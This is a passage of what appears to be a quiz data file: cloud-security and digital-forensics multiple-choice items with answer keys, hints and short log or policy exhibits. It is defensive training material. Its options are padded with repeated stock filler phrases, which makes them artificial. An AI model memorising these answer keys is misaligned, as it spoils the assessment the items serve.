    q: "Which factor should most influence the order of a cloud security roadmap?",
    options: ["The personal preference of the loudest engineer","The order in which tools were purchased","Whichever item is the cheapest to start","Risk reduction for critical assets against effort required, in most cases"],
    correct: 3, why: "Prioritisation should follow risk.",
    hint: "Risk first."
  },
  {
    id: 1223, rank: 4, role: "cloud-security", topic: "Identity Threat Exhibit", difficulty: "EXPERT",
    exhibit: "09:01 login user=cfo src=Lisbon, PT MFA=push ok\n09:07 login user=cfo src=Lagos, NG MFA=push ok (new device)\n09:09 MFA device added user=cfo device=unknown\n09:12 mailbox rule created: forward all to external",
    q: "What does this authentication log show?",
    options: ["A normal login pattern from the office","A failed login by mistake","A scheduled service sign-in","Impossible travel followed by a new MFA device registration, as a general rule"],
    correct: 3, why: "Rapid sign-ins from distant places then a new device suggest takeover.",
    hint: "Two countries in minutes."
  },
  {
    id: 1224, rank: 4, role: "cloud-security", topic: "Landing Zone Drift Controls", difficulty: "EXPERT",
    q: "What best prevents teams from weakening baseline controls in their accounts?",
    options: ["A request in the team chat","Preventive guardrails at the organisation level, in most cases","Trust in team leads, and revisit the decision after the next release","A quarterly reminder email"],
    correct: 1, why: "Preventive controls apply regardless of account administrators.",
    hint: "Guardrails."
  },
  {
    id: 1225, rank: 4, role: "cloud-security", topic: "Customer Data in Logs", difficulty: "EXPERT",
    q: "Debug logs contain full card numbers. What is the best remediation?",
    options: ["Stop logging it and mask data at the source then purge old logs","Move the logs to a cheaper tier, and revisit the decision after the next release","Rename the log group, and revisit the decision after the next release","Make the log file read only for all staff"],
    correct: 0, why: "Sensitive data should not be logged and existing copies must be removed.",
    hint: "Remove at source."
  },
  {
    id: 1226, rank: 4, role: "cloud-security", topic: "Resource Hijacking", difficulty: "EXPERT",
    q: "Which signal best indicates cryptomining abuse in a cloud account?",
    options: ["A short CPU peak during a batch job","Sustained high compute on unfamiliar instances in new regions, in most cases","A small increase in storage use","A new tag on a database"],
    correct: 1, why: "Mining shows as unplanned compute that persists.",
    hint: "Unfamiliar compute."
  },
  {
    id: 1227, rank: 4, role: "cloud-security", topic: "Shared Services Risk", difficulty: "EXPERT",
    q: "A shared service account is used by 30 applications. What is the BEST improvement?",
    options: ["Remove all monitoring for that account, and revisit the decision after the next release","Keep it shared, and the team has fewer accounts","Increase its password length and leave it shared, as a general rule","Give each application its own scoped identity and rotate secrets"],
    correct: 3, why: "Keeping it shared is the runner-up as it is simple, but one compromise exposes all thirty applications and attribution is lost.",
    hint: "Unique identities."
  },
  {
    id: 1228, rank: 4, role: "cloud-security", topic: "Security Architecture Metrics", difficulty: "EXPERT",
    q: "Which metric best shows the effect of preventive cloud guardrails?",
    options: ["More tickets closed per analyst","Fewer high-risk misconfigurations reaching production, in most cases","A longer list of exceptions","A bigger monthly log volume"],
    correct: 1, why: "A drop in risky changes shows prevention is working.",
    hint: "Prevented issues."
  },
  {
    id: 1229, rank: 4, role: "cloud-security", topic: "Resilience of Identity", difficulty: "EXPERT",
    q: "What is the best protection against loss of the central identity provider?",
    options: ["Removing all local accounts","Assuming the provider never fails, and revisit the decision after the next release","Storing admin passwords in chat, until the next scheduled review takes place","Tested break-glass access and a documented recovery plan"],
    correct: 3, why: "Identity is a single point of failure that needs a tested fallback.",
    hint: "Tested fallback."
  },
  {
    id: 1230, rank: 4, role: "cloud-security", topic: "Storage Policy Exhibit", difficulty: "EXPERT",
    exhibit: "{\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::company-reports/*\"}\nBlockPublicAccess: off",
    q: "What is the effect of this bucket policy?",
    options: ["Anyone on the internet can read every object","Objects are encrypted with a customer key","Only the account owner can read objects","Only listed roles can read objects"],
    correct: 0, why: "A wildcard principal with GetObject opens the bucket to everyone.",
    hint: "Principal: *."
  },
  {
    id: 1231, rank: 4, role: "cloud-security", topic: "Cloud Detection Coverage", difficulty: "EXPERT",
    q: "Which approach best finds gaps in cloud detection coverage?",
    options: ["Count the total number of alerts, then record the result in the ticket","Ask each team if they feel secure","Wait for a real incident, and review the outcome at the next monthly meeting","Map detections to attacker techniques, and test them, as a first step"],
    correct: 3, why: "Mapping and testing show what is and is not detected.",
    hint: "Map and test."
  },
  {
    id: 1232, rank: 4, role: "cloud-security", topic: "Container Escape Response", difficulty: "EXPERT",
    q: "A container is suspected of breaking out to the host. What is the best next step?",
    options: ["Ignore it until the next scan, until the next scheduled review takes place","Restart the container and carry on","Delete the namespace at once","Isolate the node then preserve evidence, and rotate node credentials"],
    correct: 3, why: "The node may be compromised so credentials and evidence matter.",
    hint: "Treat the node."
  },
  {
    id: 1233, rank: 4, role: "cloud-security", topic: "Policy Exception Exhibit", difficulty: "EXPERT",
    exhibit: "EX-014 public bucket       owner=none  expires=never\nEX-022 open SSH to 0.0.0.0 owner=none  expires=never\nEX-031 no MFA for admin    owner=none  expires=never\nEX-040 unencrypted volume  owner=infra expires=2026-12-31",
    q: "What is the main issue with this exception list?",
    options: ["Exceptions are approved with an expiry","Many exceptions never expire and have no owner","Each exception has a named owner","Compensating controls are recorded"],
    correct: 1, why: "Permanent unowned exceptions turn into hidden risk.",
    hint: "Expiry and owner."
  },
  {
    id: 1234, rank: 4, role: "cloud-security", topic: "Supply Chain in Cloud Builds", difficulty: "EXPERT",
    q: "Which control best protects a cloud build pipeline from dependency tampering?",
    options: ["Allowing any internet package source, in the first instance","Pinned dependencies verified against signatures and hashes","Pulling the latest version on every build","Disabling build logs, and revisit the decision after the next release"],
    correct: 1, why: "Pinning and verification prevent silent substitution.",
    hint: "Pin and verify."
  },
  {
    id: 1235, rank: 4, role: "cloud-security", topic: "Account Takeover Response", difficulty: "EXPERT",
    q: "A cloud admin account is confirmed compromised. Which sequence is best?",
    options: ["Email the user, and wait for a reply","Reset only the password and close the case","Contain the sessions then investigate and reset all credentials","Delete the account, and take no further action, where that is practical"],
    correct: 2, why: "Session revocation, scoping and credential resets are all needed.",
    hint: "Contain then scope."
  },
  {
    id: 1236, rank: 4, role: "cloud-security", topic: "Workload Credential Theft", difficulty: "EXPERT",
    exhibit: "AssumedRole: i-0a9c-app-role\nUsed from: 203.0.113.58 (external, not the instance)\nCalls: ListSecrets, GetSecretValue x 64\nInstance egress IP: 52.14.x.x",
    q: "What does this alert pattern show about a compromised workload?",
    options: ["A health probe from the managed load balancer to the application port","A scheduled job that rotates its own session token every few hours","A normal call from the application to its own database during peak hours","Role credentials used from an address outside the cloud"],
    correct: 3, why: "Role credentials issued to an instance should only be used from that instance.",
    hint: "Source address of the role use."
  },
  {
    id: 1237, rank: 4, role: "cloud-security", topic: "Residual Risk Statement", difficulty: "EXPERT",
    q: "Which wording is the best residual risk statement for a cloud exception?",
    options: ["There is no risk as the cloud provider handles all of it for us","Medium risk of exposure until the guardrail ships next quarter","The risk belongs to whoever happens to notice it first at some later point","The risk is fine and nobody needs to look at it again after this meeting"],
    correct: 1, why: "A good statement names the impact and likelihood and the date it will be reviewed.",
    hint: "Impact and date."
  },
  {
    id: 1238, rank: 4, role: "cloud-security", topic: "Rotation Failure Exhibit", difficulty: "EXPERT",
    exhibit: "secret            last_rotated  used_by\nprod/db-master    612 days ago  41 services\nprod/api-signing  230 days ago  3 services\nstaging/db        4 days ago    2 services",
    q: "What is the main problem shown by this secrets report?",
    options: ["Secrets are fetched at runtime by scoped roles that cannot read others","Production credentials have not rotated and one is shared widely","Old secrets are removed after each rotation, and the logs are archived","All secrets rotate on schedule, and each one has a single named owner"],
    correct: 1, why: "Stale and shared secrets increase exposure and make attribution harder.",
    hint: "Last rotated and used by."
  },
  {
    id: 1239, rank: 4, role: "cloud-security", topic: "Segmentation Test Results", difficulty: "EXPERT",
    q: "A penetration test summary says a test host could reach the payment network. What is the best architectural response?",
    options: ["Rename the zones, and they look separate on the network diagram","Accept it as the host was only a test system and not a real server","Remove the report from the audit file as the testers have already left","Add and test segmentation controls between those zones"],
    correct: 3, why: "Segmentation must be enforced and then tested again to prove the finding is closed.",
    hint: "Fix then retest."
  },
  {
    id: 1240, rank: 4, role: "cloud-security", topic: "Metrics for Detection Speed", difficulty: "EXPERT",
    q: "Which pair of measures best shows how quickly a cloud team handles threats?",
    options: ["Number of tools in use, and the number of dashboards that the team keeps","Mean time to detect, and mean time to contain, as a general rule","Number of staff on the team and the number of meetings that they hold","Size of the log archive, and the size of the storage that holds all of it"],
    correct: 1, why: "Detection and containment times describe how quickly threats are handled.",
    hint: "Detect and contain."
  },
  {
    id: 1241, rank: 4, role: "cloud-security", topic: "Multi-Account Incident Exhibit", difficulty: "EXPERT",
    exhibit: "10:02 dev-account AssumeRole ci-admin  src=198.51.100.88\n10:05 shared-services AssumeRole network-admin\n10:09 prod-account AssumeRole prod-break-glass\n10:11 prod-account DeleteTrail audit-trail",
    q: "What does this sequence suggest?",
    options: ["An attacker moved from a compromised developer account to production, in most cases","A normal release by the pipeline","A system backup across accounts","A routine audit by the security team"],
    correct: 0, why: "Role chaining across accounts is lateral movement.",
    hint: "Chain of roles."
  },
  {
    id: 1242, rank: 4, role: "cloud-security", topic: "Cloud Threat Hunting", difficulty: "EXPERT",
    q: "Which hypothesis is good for a cloud hunt?",
    options: ["Hunting is only for networks and cannot be applied to the logs of cloud accounts","The cloud is safe by default and, and no hunting in the logs is ever needed","Attackers create new access keys for existing users for persistence","All alerts are real attacks and and each one must be treated as a major incident"],
    correct: 2, why: "A specific behaviour can be searched in logs.",
    hint: "Specific behaviour."
  },
  {
    id: 1243, rank: 4, role: "cloud-security", topic: "Identity Perimeter Design", difficulty: "EXPERT",
    q: "How should an organisation BEST limit access to data to its own identities?",
    options: ["Organisation-wide guardrails requiring principals to belong to the organisation","Rely on strong passwords","Trust partner accounts","Use public links with expiry, and review the outcome at the next monthly meeting"],
    correct: 0, why: "Passwords are the runner-up as they help, but they cannot stop valid external credentials being accepted.",
    hint: "Organisation condition."
  },
  {
    id: 1244, rank: 4, role: "cloud-security", topic: "Key Compromise in Cloud", difficulty: "EXPERT",
    q: "What is the best response to a suspected key service compromise?",
    options: ["Rename the keys, and attackers can no longer find them in the console of the account","Disable the keys review all uses, and re-encrypt data with new keys","Ignore the event as keys in the managed service can never be used by an attacker","Delete all of the data that was protected by the keys, and nothing can leak out"],
    correct: 1, why: "Containment requires key rotation and evidence review.",
    hint: "Rotate and review."
  },
  {
    id: 1245, rank: 4, role: "cloud-security", topic: "Regulator Evidence Exhibit", difficulty: "EXPERT",
    exhibit: "Control                  Status   Evidence age\nEncryption at rest       Pass     1 day\nAudit logging            Pass     1 day\nQuarterly access review  Fail     214 days\nKey rotation             Pass     3 days",
    q: "What does this assessment say about the compliance posture?",
    options: ["Encryption and logging controls pass but access reviews are overdue","No controls were tested","All controls fail","All controls pass"],
    correct: 0, why: "Mixed results show specific gaps.",
    hint: "Look at the fails."
  },
  {
    id: 1246, rank: 4, role: "cloud-security", topic: "Supply Chain in Build Systems", difficulty: "EXPERT",
    q: "Which control best protects cloud build systems?",
    options: ["Shared long-lived runners with administrator rights, and builds never fail on access","Open internet access for all builds and dependencies can be fetched from anywhere","Isolated ephemeral runners with scoped credentials, as a general rule","Storing secrets in the build logs and engineers can find them when they need to"],
    correct: 2, why: "Ephemeral and scoped runners reduce compromise impact.",
    hint: "Ephemeral."
  },
  {
    id: 1247, rank: 4, role: "cloud-security", topic: "Detection Coverage in Cloud", difficulty: "EXPERT",
    q: "How can a team measure cloud detection coverage?",
    options: ["Wait for real incidents to occur, and then see which ones were found by the rules","Ask the staff whether they feel safe and record the answers in the next survey","Map detections to cloud attack techniques and test them","Count the number of rules that exist and report the total to the board each quarter"],
    correct: 2, why: "Testing shows real coverage.",
    hint: "Map and test."
  },
  {
    id: 1248, rank: 4, role: "cloud-security", topic: "Tenant Boundary Failure", difficulty: "EXPERT",
    q: "What is the most important response to a cross-tenant data exposure bug?",
    options: ["Hide the issue until the next release and customers do not hear about it","Contain fix assess affected tenants, and notify as required","Delete the logs that show the issue, and the evidence cannot be used against us","Wait for complaints from customers before deciding whether the issue is serious"],
    correct: 1, why: "Prompt containment and notification are essential.",
    hint: "Contain and notify."
  },
  {
    id: 1249, rank: 4, role: "cloud-security", topic: "Executive Cloud Risk Reporting", difficulty: "EXPERT",
    q: "How should cloud risk be reported to executives?",
    options: ["As technical log extracts that the board can review during the quarterly meeting","As raw counts of findings with no business context for the leaders who read them","As a list of all of the tools that the cloud team has purchased over the year","In terms of business services impact and trend, in most cases"],
    correct: 3, why: "Executives need decisions not details.",
    hint: "Business terms."
  },
  {
    id: 1250, rank: 4, role: "cloud-security", topic: "Failover Dependency Review", difficulty: "EXPERT",
    q: "Which review step best prevents a failover test failing on missing dependencies?",
    options: ["Count how many servers are in the secondary region","Run the test only on paper, then record the result in the ticket","Map dependencies such as keys secrets and DNS for each service","Check the colour of the diagrams"],
    correct: 2, why: "Hidden dependencies break recovery when untested.",
    hint: "Map dependencies."
  },
  {
    id: 1251, rank: 0, role: "digital-forensics", topic: "Purpose of Digital Forensics", difficulty: "BEGINNER",
    q: "What is the main purpose of digital forensics?",
    options: ["To replace the need for any incident response plan, as a general rule","To identify collect and analyse digital evidence properly","To remove all traces of an incident from the systems, in most cases","To decide which staff members should be dismissed"],
    correct: 1, why: "Forensics recovers and interprets evidence in a way that others can verify.",
    hint: "Evidence handling."
  },
  {
    id: 1252, rank: 0, role: "digital-forensics", topic: "Chain of Custody Meaning", difficulty: "BEGINNER",
    q: "What does chain of custody record?",
    options: ["Who handled the evidence and when it changed hands","The names of the people who work in the same office","The colour and brand of the laptop that was seized","The price paid for the storage media at purchase"],
    correct: 0, why: "An unbroken record shows the evidence was not altered or swapped.",
    hint: "Who and when."
  },
  {
    id: 1253, rank: 0, role: "digital-forensics", topic: "Write Blocker Role", difficulty: "BEGINNER",
    q: "Why is a write blocker used when connecting a suspect drive?",
    options: ["It stops any change being written to the original drive","It makes the copy of the drive run twice as fast","It removes deleted files from the drive for the examiner","It encrypts the drive, and nobody else can read it"],
    correct: 0, why: "Blocking writes preserves the original state of the evidence.",
    hint: "Read only."
  },
  {
    id: 1254, rank: 0, role: "digital-forensics", topic: "Hash Value Use", difficulty: "BEGINNER",
    q: "Why calculate a hash of a disk image?",
    options: ["To find the owner of the computer that was imaged","To hide the contents from anyone who opens the file","To show later that the image has not changed","To compress the image and it takes less space"],
    correct: 2, why: "A matching hash proves the data is identical to what was first acquired.",
    hint: "Integrity check."
  },
  {
    id: 1255, rank: 0, role: "digital-forensics", topic: "Volatile Data Example", difficulty: "BEGINNER",
    q: "Which of these is volatile data on a running computer?",
    options: ["Files saved on the hard disk","The contents of memory","Photos stored on a USB stick","A printed report in a drawer"],
    correct: 1, why: "Memory is lost when the computer is powered off.",
    hint: "Lost at power off."
  },
  {
    id: 1256, rank: 0, role: "digital-forensics", topic: "First Responder Action", difficulty: "BEGINNER",
    q: "A suspect laptop is found switched on and unlocked. What is the BEST first action for the first responder?",
    options: ["Browse the files to see what the user was doing","Close all open programs, and shut the laptop down at once, where that is practical","Photograph the screen and record what is running before any change","Plug in a USB drive and copy the documents folder, as a general rule"],
    correct: 2, why: "Shutting down at once is the runner-up as it feels safe, but it destroys volatile data that may be the only copy of key evidence.",
    hint: "Document before touching."
  },
  {
    id: 1257, rank: 0, role: "digital-forensics", topic: "Evidence Bag Labelling", difficulty: "BEGINNER",
    q: "What information should an evidence label carry?",
    options: ["Only the brand name of the device inside the bag","The personal opinion of the collector about the case, in most cases","Only the price of the device when it was bought","Item number description date time and the name of the collector"],
    correct: 3, why: "Clear labelling lets anyone identify and track the item.",
    hint: "Identify the item."
  },
  {
    id: 1258, rank: 0, role: "digital-forensics", topic: "Forensic Copy vs Backup", difficulty: "BEGINNER",
    q: "How does a forensic image differ from an ordinary backup?",
    options: ["It copies only the files that the user chose to keep","It copies every sector including deleted and unused space","It is stored only in the cloud to save disk space","It cannot be verified after it has been made"],
    correct: 1, why: "A bit-for-bit copy preserves hidden and deleted data.",
    hint: "Every sector."
  },
  {
    id: 1259, rank: 0, role: "digital-forensics", topic: "Deleted File Behaviour", difficulty: "BEGINNER",
    q: "What usually happens when a file is deleted in a normal way?",
    options: ["The data is erased from the disk at that moment","The data is encrypted using the user's password","The data is moved to a secret folder on the network","The space is marked as free but the data often remains"],
    correct: 3, why: "The data stays until it is overwritten which makes recovery possible.",
    hint: "Marked not erased."
  },
  {
    id: 1260, rank: 0, role: "digital-forensics", topic: "File Timestamp Exhibit", difficulty: "BEGINNER",
    exhibit: "File: Q3-report.docx\nCreated:   2025-10-02 09:14:31\nModified:  2025-10-09 17:48:02\nAccessed:  2025-10-10 08:00:12\nSize: 48,120 bytes",
    q: "What does this file listing suggest about the report file?",
    options: ["It was created after it was last modified","It was never opened or changed","It was modified after it was created","It was copied from another computer on that day"],
    correct: 2, why: "A modified time later than the created time shows later changes.",
    hint: "Compare the dates."
  },
  {
    id: 1261, rank: 0, role: "digital-forensics", topic: "Legal Authority to Search", difficulty: "BEGINNER",
    q: "Why should an examiner confirm legal authority before examining a device?",
    options: ["Evidence taken without authority may be unusable","Authority is needed only when the device is new, and has never been used before","Authority makes the examination run more quickly on the examiner's workstation","Authority is never needed for a company laptop as the employer owns the device"],
    correct: 0, why: "Proper authorisation protects both the examiner and the case.",
    hint: "Authority first."
  },
  {
    id: 1262, rank: 0, role: "digital-forensics", topic: "Documentation Habit", difficulty: "BEGINNER",
    q: "Why should an examiner keep detailed contemporaneous notes?",
    options: ["So that the case can be closed without any review by a second examiner","So that the final report can be made much shorter for the busy managers","So every step can be explained and repeated later","So that the notes can be shared with the suspect before the interview starts"],
    correct: 2, why: "Good notes make findings credible and reproducible.",
    hint: "Write as you go."
  },
  {
    id: 1263, rank: 0, role: "digital-forensics", topic: "Working on Copies", difficulty: "BEGINNER",
    q: "Why should analysis be done on a copy and not the original evidence?",
    options: ["It protects the original from accidental change","It avoids the need to record any hash value","It makes the analysis finish in half the time","It lets the examiner delete files that are not needed"],
    correct: 0, why: "The original must stay unchanged as the reference.",
    hint: "Protect the original."
  },
  {
    id: 1264, rank: 0, role: "digital-forensics", topic: "Metadata Meaning", difficulty: "BEGINNER",
    q: "What is metadata in a digital file?",
    options: ["The main text that is visible on the page","The icon that is shown on the desktop","The password that protects the file, as a general rule","Data about the file such as author dates and device"],
    correct: 3, why: "Metadata can show how and when a file was created or changed.",
    hint: "Data about data."
  },
  {
    id: 1265, rank: 0, role: "digital-forensics", topic: "Email Header Exhibit", difficulty: "BEGINNER",
    exhibit: "Received: from mail.example.net (203.0.113.8) by mx1.corp.example with SMTP; Mon, 03 Nov 2025 09:12:40 +0000\nReceived: from [10.4.4.19] by mail.example.net; Mon, 03 Nov 2025 09:12:36 +0000\nFrom: Alex <alex@example.net>\nSubject: Invoice",
    q: "Which part of this header most helps trace the route of the message?",
    options: ["The font used in the body of the message, in most cases","The Subject line chosen by the sender, as a general rule","The Received lines showing each server that handled it","The signature block at the end of the message, as a general rule"],
    correct: 2, why: "Received lines record the servers the message passed through.",
    hint: "Follow the servers."
  },
  {
    id: 1266, rank: 0, role: "digital-forensics", topic: "Order of Volatility", difficulty: "BEGINNER",
    q: "Which source of evidence is BEST collected FIRST on a live system?",
    options: ["Paper records in a filing cabinet","Memory and running processes","Printed network diagrams","Archived backups from last year"],
    correct: 1, why: "Archived backups are the runner-up as they are valuable, but they do not change quickly while memory can be lost within seconds.",
    hint: "Most fragile first."
  },
  {
    id: 1267, rank: 0, role: "digital-forensics", topic: "Evidence Storage", difficulty: "BEGINNER",
    q: "How should seized devices be stored before examination?",
    options: ["In an open drawer in a shared office, as a general rule","With the suspect and they can keep them safe","In a car for convenience until needed, as a general rule","In a secure location with access limited, and recorded"],
    correct: 3, why: "Controlled storage maintains integrity and custody.",
    hint: "Secure and logged."
  },
  {
    id: 1268, rank: 0, role: "digital-forensics", topic: "Photographing the Scene", difficulty: "BEGINNER",
    q: "Why photograph a device and its connections before moving it?",
    options: ["To record its original state and layout","To share pictures with the press, as a general rule","To make the case file look larger","To avoid labelling the cables, as a general rule"],
    correct: 0, why: "Photos show how things were found.",
    hint: "Record as found."
  },
  {
    id: 1269, rank: 0, role: "digital-forensics", topic: "File Extension Mismatch", difficulty: "BEGINNER",
    q: "A file named holiday.jpg opens as a program file. What does this suggest?",
    options: ["The file is a normal picture","The file is damaged by the drive","The file belongs to the examiner","The extension may have been changed to hide the file type"],
    correct: 3, why: "File signatures show the true type regardless of the name.",
    hint: "Name versus content."
  },
  {
    id: 1270, rank: 0, role: "digital-forensics", topic: "Browser History Value", difficulty: "BEGINNER",
    q: "What can browser history help an investigator understand?",
    options: ["The model of the router, as a general rule","The speed of the internet connection, as a general rule","The password of the user for each site, in most cases","Which sites were visited and roughly when"],
    correct: 3, why: "Browsing records show user activity over time.",
    hint: "Sites and times."
  },
  {
    id: 1271, rank: 0, role: "digital-forensics", topic: "Time Zone Awareness", difficulty: "BEGINNER",
    q: "Why must an examiner note the time zone setting of a system?",
    options: ["The time zone sets the password rules that the users must follow each month","The time zone decides which files are deleted by the system at midnight","Timestamps may need converting for a correct timeline","The time zone changes the contents of the files that are stored on disk"],
    correct: 2, why: "Misread time zones produce wrong sequences of events.",
    hint: "Convert times."
  },
  {
    id: 1272, rank: 0, role: "digital-forensics", topic: "Imaging Log Exhibit", difficulty: "BEGINNER",
    exhibit: "Source: /dev/sdb  Size: 500107862016 bytes\nSource MD5: 9a1f3c0b77e4d2a8c5e61f09b3d7a412\nImage MD5:  9a1f3c0b77e4d2a8c5e61f09b3d7a412\nBad sectors: 0   Result: SUCCESS",
    q: "What does this imaging log show about the acquisition?",
    options: ["The image is different from the source drive","The imaging failed with read errors","The drive was not connected","The image hash matches the source hash"],
    correct: 3, why: "Matching hashes confirm an exact copy.",
    hint: "Compare hashes."
  },
  {
    id: 1273, rank: 0, role: "digital-forensics", topic: "Mobile Device Isolation", difficulty: "BEGINNER",
    q: "A suspect smartphone is on and connected to the network. What is the BEST step to preserve evidence?",
    options: ["Reset it to factory settings to clear errors","Let it keep receiving messages and nothing is missed","Isolate it from the network using a shielded bag or airplane mode, as a first step","Turn it off and remove the battery at once, and review the outcome at the next monthly meeting"],
    correct: 2, why: "Powering off is the runner-up as it stops changes, but it can lock the device and lose volatile data while network isolation stops remote wiping.",
    hint: "Stop remote changes."
  },
  {
    id: 1274, rank: 0, role: "digital-forensics", topic: "Role of an Examiner", difficulty: "BEGINNER",
    q: "What is the main duty of a forensic examiner when giving findings?",
    options: ["To report facts objectively within their expertise, in most cases","To avoid mentioning any evidence that does not fit the favoured theory","To support the side that has hired them and to avoid unhelpful facts","To guess what the suspect might have intended when they used the device"],
    correct: 0, why: "Objectivity is central to credibility.",
    hint: "Objective facts."
  },
  {
    id: 1275, rank: 0, role: "digital-forensics", topic: "USB Device History", difficulty: "BEGINNER",
    q: "What can system records show about USB devices?",
    options: ["The contents of every device ever connected","Which devices were connected, and when","The passwords stored on the devices","The location where the devices were bought"],
    correct: 1, why: "System logs record device identifiers and times.",
    hint: "Device connection history."
  },
  {
    id: 1276, rank: 0, role: "digital-forensics", topic: "Cloud Evidence Basics", difficulty: "BEGINNER",
    q: "Why is evidence in cloud services harder to collect than on a local drive?",
    options: ["The data cannot be copied in any way once it has been placed in the cloud","The data may be held by a provider in several places","The data is always deleted automatically after one day by every provider","The data is always encrypted with a key that only the examiner would hold"],
    correct: 1, why: "Cloud data needs legal and provider cooperation.",
    hint: "Held by others."
  },
  {
    id: 1277, rank: 0, role: "digital-forensics", topic: "Network Logs Evidence", difficulty: "BEGINNER",
    q: "What can firewall logs help establish in an investigation?",
    options: ["The names of staff in the building, as a general rule","Which connections were allowed or blocked and when","The documents stored on the servers, as a general rule","The colour of the cabling"],
    correct: 1, why: "Logs show communication patterns.",
    hint: "Connections and times."
  },
  {
    id: 1278, rank: 0, role: "digital-forensics", topic: "Hash Algorithm Choice", difficulty: "BEGINNER",
    q: "Which hash type is preferred today for forensic integrity checks?",
    options: ["SHA-256, in most cases","The file name in upper case","The date the file was created","A simple checksum of the file length"],
    correct: 0, why: "Strong modern hashes resist collisions.",
    hint: "Strong hash."
  },
  {
    id: 1279, rank: 0, role: "digital-forensics", topic: "Report Reader", difficulty: "BEGINNER",
    q: "Who should a forensic report be written for?",
    options: ["Readers who are not technical such as managers or lawyers","Only the suspect","Only the vendor of the tools","Only other forensic examiners"],
    correct: 0, why: "Findings must be understandable by decision makers.",
    hint: "Plain language."
  },
  {
    id: 1280, rank: 0, role: "digital-forensics", topic: "Recycle Bin Artefact", difficulty: "BEGINNER",
    q: "What can a recycle bin record show an investigator?",
    options: ["The user's passwords, in most cases","The language of the keyboard, in most cases","The speed of the disk, in most cases","Files the user deleted and when"],
    correct: 3, why: "It keeps details of deleted items until emptied.",
    hint: "Deleted items."
  },
  {
    id: 1281, rank: 0, role: "digital-forensics", topic: "Evidence Transfer Exhibit", difficulty: "BEGINNER",
    exhibit: "Item 007  Laptop (Dell, S/N 4F7K2)\n2025-11-03 10:20 collected by J. Ames -> evidence store (signed)\n2025-11-05 ??:?? evidence store -> examiner R. Cole (no signature)\n2025-11-06 15:00 examiner R. Cole -> lab (signed)",
    q: "What is the problem with this transfer record?",
    options: ["All transfers are signed and timed","There is no signature or time for the second hand-over","The item description is complete","The record is stored securely"],
    correct: 1, why: "Gaps in a custody record weaken the evidence.",
    hint: "Look for blanks."
  },
  {
    id: 1282, rank: 0, role: "digital-forensics", topic: "Live vs Dead Acquisition", difficulty: "BEGINNER",
    q: "What is a dead acquisition?",
    options: ["Imaging memory of a running system","Imaging a drive from a powered-off system, in most cases","Copying files over email, then record the result in the ticket","Taking photos of the screen, and revisit the decision after the next release"],
    correct: 1, why: "Dead acquisition avoids running the suspect system.",
    hint: "Powered off."
  },
  {
    id: 1283, rank: 0, role: "digital-forensics", topic: "Password Protected Files", difficulty: "BEGINNER",
    q: "What is the best first approach to a password-protected file?",
    options: ["Seek lawful ways to obtain the password, and keep a record, in most cases","Delete the file to avoid the problem, and revisit the decision after the next release","Ask the vendor to unlock it for free","Guess random words until it opens"],
    correct: 0, why: "Methods must be lawful and documented.",
    hint: "Lawful and recorded."
  },
  {
    id: 1284, rank: 0, role: "digital-forensics", topic: "Privacy in Examinations", difficulty: "BEGINNER",
    q: "How should an examiner treat personal data unrelated to the case?",
    options: ["Share it with colleagues for fun, until the next scheduled review takes place","Copy it for later interest, and review the outcome at the next monthly meeting","Publish it in the report, and revisit the decision after the next release","Avoid viewing it more than necessary and protect it, in most cases"],
    correct: 3, why: "Examinations should be proportionate and respect privacy.",
    hint: "Minimise exposure."
  },
  {
    id: 1285, rank: 0, role: "digital-forensics", topic: "Date Format Confusion", difficulty: "BEGINNER",
    q: "Why can date formats cause errors in evidence?",
    options: ["Dates are only used in emails","Dates cannot be stored in files","Different regions place the day, and month in a different order, in most cases","Dates are always in the same format worldwide"],
    correct: 2, why: "Ambiguous formats may lead to wrong timelines.",
    hint: "Day and month."
  },
  {
    id: 1286, rank: 0, role: "digital-forensics", topic: "Chain of Events Timeline", difficulty: "BEGINNER",
    q: "What is a timeline in an investigation?",
    options: ["A list of tools by price","A list of users by name","An ordered record of events built from many sources, as a general rule","A list of files by size"],
    correct: 2, why: "Timelines show how an incident developed.",
    hint: "Events in order."
  },
  {
    id: 1287, rank: 0, role: "digital-forensics", topic: "Photograph of Serial Numbers", difficulty: "BEGINNER",
    q: "Why record serial numbers of seized devices?",
    options: ["To identify each item uniquely","To impress the court, as a general rule","To make the label colourful","To avoid hashing, in most cases"],
    correct: 0, why: "Unique identifiers prevent confusion between similar items.",
    hint: "Unique id."
  },
  {
    id: 1288, rank: 0, role: "digital-forensics", topic: "Seizure Scope Exhibit", difficulty: "BEGINNER",
    exhibit: "Warrant: Items: laptop (Dell Latitude S/N 4F7K2)\nFound at scene: laptop, tablet (iPad), two USB drives\nWarrant covers: laptop only",
    q: "The warrant covers the suspect's laptop only. A tablet is found next to it. What is the BEST action?",
    options: ["Take it and delete the data it holds, until the next scheduled review takes place","Document it and seek authority before examining it, as a general rule","Examine it as it is in the same room","Leave it with the suspect, and say nothing, and review the outcome at the next monthly meeting"],
    correct: 1, why: "Examining it is the runner-up as it seems practical, but acting outside authority risks the whole case.",
    hint: "Stay in scope."
  },
  {
    id: 1289, rank: 0, role: "digital-forensics", topic: "Encryption at the Scene", difficulty: "BEGINNER",
    q: "A laptop with full-disk encryption is found switched on. Why is this important?",
    options: ["The laptop must be wiped","The encryption will remove all evidence","Powering it off may make the data unreadable","The laptop is automatically safe"],
    correct: 2, why: "Live data may be needed before the encryption key is lost.",
    hint: "Key in memory."
  },
  {
    id: 1290, rank: 0, role: "digital-forensics", topic: "Anti-Forensic Awareness", difficulty: "BEGINNER",
    q: "What is an anti-forensic technique?",
    options: ["A way to write reports","A way to label evidence bags, as a general rule","A tool that speeds up analysis, as a general rule","An action intended to hide or destroy evidence"],
    correct: 3, why: "Examiners must consider attempts to hide traces.",
    hint: "Hiding traces."
  },
  {
    id: 1291, rank: 0, role: "digital-forensics", topic: "Log Retention Gap", difficulty: "BEGINNER",
    exhibit: "2025-11-03 08:59:58 service start\n2025-11-03 09:00:12 login ok user=ana\n[no entries]\n2025-11-04 03:41:05 log service start\n2025-11-04 03:41:11 login ok user=svc-admin",
    q: "What does a gap in a system's log record suggest?",
    options: ["The logs are always perfect","The logs may have been cleared or the system was off","The logs belong to another system","The gap has no meaning"],
    correct: 1, why: "Gaps may signal tampering or downtime and need explaining.",
    hint: "Look at the gap."
  },
  {
    id: 1292, rank: 0, role: "digital-forensics", topic: "Handling of Original Media", difficulty: "BEGINNER",
    q: "Where should original media be kept once imaged?",
    options: ["On the examiner's desk for convenience, as a general rule","In the suspect's bag","In the recycling","In secure storage with the custody record updated"],
